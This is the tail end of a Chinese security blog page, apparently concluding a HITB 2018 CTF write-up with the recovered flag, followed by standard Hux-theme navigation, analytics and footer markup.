+<p>得到flag</p>
+<p>$ cat flag_is_here<br>HITB{Py5h0n1st8eBe3tNOW}</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/04/bctf2018-love-q/" data-toggle="tooltip" data-placement="top" title="BCTF2018 LOVE Q">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/04/2018-0ctf-loginme/" data-toggle="tooltip" data-placement="top" title="2018 0ctf-部分writeup">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
